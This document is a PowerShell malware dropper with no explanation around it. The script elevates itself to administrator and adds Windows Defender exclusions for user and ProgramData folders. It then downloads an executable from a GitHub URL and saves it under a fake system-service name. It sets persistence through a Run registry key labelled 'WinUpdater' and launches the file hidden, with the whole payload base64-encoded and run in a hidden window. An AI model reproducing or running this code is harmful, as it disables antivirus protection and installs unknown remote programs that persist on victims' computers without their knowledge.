$Code = {
    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition)))" -Verb RunAs
        exit
    }

    Add-MpPreference -ExclusionPath "C:\ProgramData", "C:\Users" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe", "SystemUpdate.exe" -ErrorAction SilentlyContinue

    Start-Sleep -Seconds 5

    $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
    $o = "C:\ProgramData\win_sys_service.exe"

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($u, $o)
        Unblock-File -Path "$o" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$o`"" -ErrorAction SilentlyContinue
        Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
    } catch {}
}.ToString()

$Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Code))
powershell.exe -NoP -W Hidden -Enco $Encoded
